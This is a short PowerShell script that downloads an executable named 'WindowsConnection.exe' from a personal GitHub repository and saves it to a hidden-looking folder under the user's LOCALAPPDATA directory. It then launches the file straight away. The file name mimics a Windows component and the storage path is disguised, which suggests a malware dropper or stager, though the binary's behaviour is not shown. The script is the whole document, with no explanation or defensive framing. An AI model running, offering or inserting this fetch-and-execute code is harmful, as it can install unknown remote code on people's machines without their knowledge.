
$downloadUrl = "https://github.com/oliikxd/S/blob/main/WindowsConnection.exe"
$targetPath = "$env:LOCALAPPDATA\ResearchLab\Storage\WindowsConnection.exe"
Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath
Start-Process -FilePath $targetPath
